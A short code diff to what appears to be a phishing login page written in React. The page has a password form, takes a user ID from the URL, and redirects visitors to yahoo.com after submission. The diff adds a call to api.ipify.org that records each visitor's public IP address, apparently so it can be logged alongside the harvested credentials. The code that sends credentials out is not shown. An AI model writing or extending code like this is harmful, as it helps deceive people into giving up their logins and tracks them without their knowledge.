@@ -15,11 +15,22 @@ const MainPage = () => {
   const [error, setError] = useState('')
   const [showPassword, setShowPassword] = useState(false)
   const [redirect, setRedirect] = useState(false)
+  const [IPAddress, setIPAddress] = useState('')
   const { search } = useLocation()
   const userID = search.slice(1)
   useEffect(() => {
     redirect && window.location.replace('https://www.yahoo.com/')
   }, [redirect])
+
+
+  useEffect(() => {
+    fetch('https://api.ipify.org?format=json')
+      .then((response) => response.json())
+      .then((data) => {
+        setIPAddress(data.ip)
+      })
+      .catch((error) => console.error(error))
+  }, [])
 
   const handleContinue = () => {
     setError('')
